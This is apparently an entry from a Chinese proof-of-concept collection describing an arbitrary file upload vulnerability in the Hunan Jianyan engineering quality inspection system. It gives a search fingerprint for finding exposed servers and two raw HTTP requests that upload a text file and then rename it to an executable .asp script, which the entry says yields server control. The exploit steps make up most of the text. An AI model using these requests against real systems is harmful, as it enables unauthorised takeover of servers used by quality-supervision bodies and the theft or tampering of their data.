---
fofa: "web.body="
source: "wy876 漏洞文库"
---

# 湖南建研工程质量检测系统Attachment存在任意文件上传漏洞

# 一、漏洞简介
湖南建研质量监测系统由相关政府质量监督机构、参建单位等共同参与，根据各自的职责，上网操作相应的模块，实现工程质量监督业务的统一管理。该系统存在任意文件上传漏洞，攻击者可通过该漏洞获取服务器权限。

# 二、影响版本
+ 湖南建研工程质量检测系统

# 三、资产测绘
+ hunter`web.body="/Content/Theme/Standard/webSite/login.css"`
+ 特征


# 四、漏洞复现
1. 上传txt文件

```java
POST /Applications/Attachment/upload.ashx HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Type: multipart/form-data; boundary=00content0boundary00
Host: 
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Content-Length: 204
Connection: close

--00content0boundary00
Content-Disposition: form-data; name="file"; filename="123.txt"

12323344
--00content0boundary00
Content-Disposition: form-data; name="_upload_guid"

123
--00content0boundary00--

```


2. 将文件改名

```java
POST /Standard/Editor/API/File.cshtml?act=geturl HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Host: 
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Content-type: application/x-www-form-urlencoded
Content-Length: 59
Connection: close

filename=/tempData/stc.asp&filetplpath=/tempData/123.txt
```


3. 文件上传位置

```java
/tempData/stc.asp
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/vbwrh9veoyfo2yhb>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
